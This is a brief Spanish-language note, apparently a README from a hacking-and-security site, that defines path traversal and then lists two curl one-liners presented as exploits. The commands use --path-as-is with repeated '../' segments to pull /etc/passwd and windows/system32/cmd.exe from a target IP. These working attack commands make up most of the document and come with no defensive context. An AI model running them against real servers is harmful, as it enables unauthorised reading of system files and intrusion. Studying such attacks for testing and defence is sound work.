## directoriotrasversal
##
Path Traversal (o Directory Traversal) es una vulnerabilidad web que permite a un atacante acceder a archivos y directorios fuera del directorio raíz del servidor web.
#
## Exploits para explotar la vulnerabilidade de directorio trasversal o path traversal.
#

curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd

curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe

## http://www.hackingyseguridad.com

Codigos de respuesta HTTP https://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html
